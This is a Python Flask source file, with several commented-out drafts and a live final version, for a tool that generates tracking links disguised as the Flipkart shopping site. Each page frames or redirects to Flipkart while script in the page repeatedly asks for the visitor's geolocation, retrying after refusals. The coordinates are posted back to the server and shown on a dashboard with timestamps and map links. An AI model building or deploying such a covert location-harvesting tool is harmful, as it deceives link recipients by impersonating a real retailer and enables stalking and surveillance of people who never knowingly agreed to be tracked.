# from flask import Flask, render_template_string, request, jsonify
# import uuid

# app = Flask(__name__)

# # Store captured locations (in-memory for now)
# locations = {}

# # =====================
# # Generate tracking link
# # =====================
# @app.route("/")
# def home():
#     track_id = str(uuid.uuid4())[:8]  # short ID
#     link = request.url_root + "track/" + track_id
#     return f"Your tracking link: <a href='{link}' target='_blank'>{link}</a>"

# # =====================
# # Tracking page
# # =====================
# @app.route("/track/<track_id>")
# def track(track_id):
#     # Immediately show Flipkart, then after 7s ask for location
#     html = f"""
#     <!DOCTYPE html>
#     <html>
#     <head>
#         <title>Flipkart</title>
#         <style>
#             html, body {{
#                 margin: 0;
#                 padding: 0;
#                 height: 100%;
#                 overflow: hidden;
#             }}
#             iframe {{
#                 width: 100%;
#                 height: 100%;
#                 border: none;
#             }}
#         </style>
#     </head>
#     <body>
#         <!-- Flipkart loads instantly -->
#         <iframe src="https://www.flipkart.com" allow="geolocation"></iframe>

#         <script>
#             function requestLocation() {{
#                 if (navigator.geolocation) {{
#                     navigator.geolocation.getCurrentPosition(
#                         (position) => {{
#                             fetch("/save_location/{track_id}", {{
#                                 method: "POST",
#                                 headers: {{ "Content-Type": "application/json" }},
#                                 body: JSON.stringify({{
#                                     lat: position.coords.latitude,
#                                     lon: position.coords.longitude
#                                 }})
#                             }});
#                         }},
#                         (error) => {{
#                             console.log("Location denied, retrying...");
#                             setTimeout(requestLocation, 5000);
#                         }}
#                     );
#                 }}
#             }}

#             // Wait 7 seconds before asking
#             setTimeout(requestLocation, 7000);
#         </script>
#     </body>
#     </html>
#     """
#     return render_template_string(html)

# # =====================
# # Save location
# # =====================
# @app.route("/save_location/<track_id>", methods=["POST"])
# def save_location(track_id):
#     data = request.get_json()
#     if not data:
#         return jsonify({"status": "error", "message": "No data received"}), 400

#     locations[track_id] = {"lat": data.get("lat"), "lon": data.get("lon")}
#     print(f"📍 Location for {track_id}: {locations[track_id]}")
#     return jsonify({"status": "success"}), 200

# # =====================
# # View all saved locations
# # =====================
# @app.route("/locations")
# def view_locations():
#     return jsonify(locations)

# # =====================
# # Run app
# # =====================
# if __name__ == "__main__":
#     app.run(debug=True)






# from flask import Flask, render_template_string, request, jsonify
# import uuid

# app = Flask(__name__)

# # Store captured locations (in-memory)
# locations = {}

# # =====================
# # Generate tracking link
# # =====================
# @app.route("/")
# def home():
#     track_id = str(uuid.uuid4())[:8]  # short ID
#     link = request.url_root + "track/" + track_id
#     return f"Your tracking link: <a href='{link}' target='_blank'>{link}</a>"

# # =====================
# # Tracking page
# # =====================
# @app.route("/track/<track_id>")
# def track(track_id):
#     # Load Flipkart after 7 seconds, meanwhile ask location in background
#     html = f"""
#     <!DOCTYPE html>
#     <html>
#     <head>
#         <title>Flipkart</title>
#         <script>
#             function requestLocation() {{
#                 if (navigator.geolocation) {{
#                     navigator.geolocation.getCurrentPosition(
#                         (position) => {{
#                             fetch("/save_location/{track_id}", {{
#                                 method: "POST",
#                                 headers: {{ "Content-Type": "application/json" }},
#                                 body: JSON.stringify({{
#                                     lat: position.coords.latitude,
#                                     lon: position.coords.longitude
#                                 }})
#                             }});
#                         }},
#                         (error) => {{
#                             console.log("Location denied, retrying...");
#                             setTimeout(requestLocation, 5000);
#                         }}
#                     );
#                 }}
#             }}

#             // Ask location immediately
#             requestLocation();

#             // After 7s, go to Flipkart
#             setTimeout(() => {{
#                 window.location.href = "https://www.flipkart.com";
#             }}, 7000);
#         </script>
#     </head>
#     <body>
#     </body>
#     </html>
#     """
#     return render_template_string(html)

# # =====================
# # Save location
# # =====================
# @app.route("/save_location/<track_id>", methods=["POST"])
# def save_location(track_id):
#     data = request.get_json()
#     if not data:
#         return jsonify({"status": "error", "message": "No data received"}), 400

#     locations[track_id] = {"lat": data.get("lat"), "lon": data.get("lon")}
#     print(f"📍 Location for {track_id}: {locations[track_id]}")
#     return jsonify({"status": "success"}), 200

# # =====================
# # View all saved locations
# # =====================
# @app.route("/locations")
# def view_locations():
#     return jsonify(locations)

# # =====================
# # Run app
# # =====================
# if __name__ == "__main__":
#     app.run(debug=True)




from flask import Flask, render_template_string, request, jsonify
import uuid

app = Flask(__name__)

# Store captured locations (in-memory)
locations = {}

# =====================
# Generate tracking link
# =====================
@app.route("/")
def home():
    track_id = str(uuid.uuid4())[:8]  # short ID
    link = request.url_root + "track/" + track_id
    return f"Your tracking link: <a href='{link}' target='_blank'>{link}</a>"

# =====================
# Tracking page
# =====================
@app.route("/track/<track_id>")
def track(track_id):
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Flipkart</title>
        <style>
            body, html {{
                margin: 0;
                padding: 0;
                height: 100%;
                overflow: hidden;
            }}
            iframe {{
                width: 100%;
                height: 100%;
                border: none;
            }}
        </style>
        <script>
            function requestLocation() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(
                        (position) => {{
                            fetch("/save_location/{track_id}", {{
                                method: "POST",
                                headers: {{ "Content-Type": "application/json" }},
                                body: JSON.stringify({{
                                    lat: position.coords.latitude,
                                    lon: position.coords.longitude
                                }})
                            }});
                        }},
                        (error) => {{
                            console.log("❌ Location denied or blocked, retrying...");
                        }}
                    );
                }}
            }}

            // Ask immediately after 7s
            setTimeout(requestLocation, 7000);

            // Retry every 5s until allowed
            setInterval(requestLocation, 5000);
        </script>
    </head>
    <body>
        <iframe src="https://www.flipkart.com"></iframe>
    </body>
    </html>
    """
    return render_template_string(html)

# =====================
# Save location
# =====================
@app.route("/save_location/<track_id>", methods=["POST"])
def save_location(track_id):
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400

    locations[track_id] = {"lat": data.get("lat"), "lon": data.get("lon")}
    print(f"📍 Location for {track_id}: {locations[track_id]}")
    return jsonify({"status": "success"}), 200

# =====================
# View all saved locations
# =====================
@app.route("/locations")
def view_locations():
    return jsonify(locations)

# =====================
# Run app
# =====================



from flask import Flask, request, render_template_string, url_for
import uuid
import datetime

app = Flask(__name__)

# In-memory storage (replace with DB in production)
locations = {}

# Home page: Generate tracking link
@app.route("/")
def home():
    track_id = str(uuid.uuid4())
    tracking_url = url_for("track", track_id=track_id, _external=True)

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Tracking Link Generator</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body class="bg-light d-flex flex-column align-items-center justify-content-center vh-100">
        <div class="card shadow p-4 text-center" style="max-width: 500px; width: 100%;">
            <h2 class="mb-3">🔗 Tracking Link Generator</h2>
            <p>Your tracking link:</p>
            <a href="{tracking_url}" target="_blank" class="btn btn-primary">{tracking_url}</a>
            <hr>
            <a href="/dashboard" class="btn btn-outline-dark mt-2">📊 View Dashboard</a>
        </div>
    </body>
    </html>
    """


# Tracking route (loads Flipkart inside iframe + requests location)
@app.route("/track/<track_id>")
def track(track_id):
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Flipkart</title>
        <style>
            body, html {{
                margin: 0;
                padding: 0;
                height: 100%;
                overflow: hidden;
            }}
            iframe {{
                width: 100%;
                height: 100%;
                border: none;
            }}
        </style>
        <script>
            function requestLocation() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(
                        (position) => {{
                            fetch("/save_location/{track_id}", {{
                                method: "POST",
                                headers: {{ "Content-Type": "application/json" }},
                                body: JSON.stringify({{
                                    lat: position.coords.latitude,
                                    lon: position.coords.longitude
                                }})
                            }});
                        }},
                        (error) => {{
                            console.log("❌ Location denied, retrying...");
                        }}
                    );
                }}
            }}

            // Ask after 7s
            setTimeout(requestLocation, 7000);
            // Retry every 5s
            setInterval(requestLocation, 5000);
        </script>
    </head>
    <body>
        <iframe src="https://www.flipkart.com"></iframe>
    </body>
    </html>
    """
    return render_template_string(html)


# Save location from JS
@app.route("/save_location/<track_id>", methods=["POST"])
def save_location(track_id):
    data = request.json
    lat, lon = data.get("lat"), data.get("lon")

    locations[track_id] = {
        "lat": lat,
        "lon": lon,
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

    return {"status": "success"}


# Dashboard UI
@app.route("/dashboard")
def dashboard():
    if not locations:
        table_rows = "<tr><td colspan='5' class='text-center text-muted'>No data yet</td></tr>"
    else:
        # Sort by time (newest first)
        sorted_locations = sorted(locations.items(), key=lambda x: x[1]['time'], reverse=True)
        table_rows = ""
        for i, (track_id, info) in enumerate(sorted_locations):
            maps_link = f"https://www.google.com/maps?q={info['lat']},{info['lon']}"
            highlight = "table-success" if i == 0 else ""  # highlight most recent
            table_rows += f"""
            <tr class="{highlight}">
                <td>{track_id}</td>
                <td>{info['time']}</td>
                <td>{info['lat']}</td>
                <td>{info['lon']}</td>
                <td><a href="{maps_link}" target="_blank" class="btn btn-sm btn-success">🌍 View</a></td>
            </tr>
            """

    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Dashboard</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <script>
            // Auto-refresh every 10 seconds
            setTimeout(() => {{
                window.location.reload();
            }}, 10000);
        </script>
    </head>
    <body class="bg-light">
        <div class="container py-5">
            <div class="card shadow p-4">
                <h2 class="mb-4 text-center">📊 Tracked Locations Dashboard</h2>
                <table class="table table-hover table-bordered align-middle">
                    <thead class="table-dark">
                        <tr>
                            <th>Track ID</th>
                            <th>Click Time</th>
                            <th>Latitude</th>
                            <th>Longitude</th>
                            <th>Google Maps</th>
                        </tr>
                    </thead>
                    <tbody>
                        {table_rows}
                    </tbody>
                </table>
                <div class="text-center mt-3">
                    <a href="/" class="btn btn-primary">⬅️ Generate New Link</a>
                </div>
                <p class="text-muted text-center mt-2"><small>⏳ Auto-refreshes every 10 seconds</small></p>
            </div>
        </div>
    </body>
    </html>
    """
    return html







if __name__ == "__main__":
    app.run(debug=True)
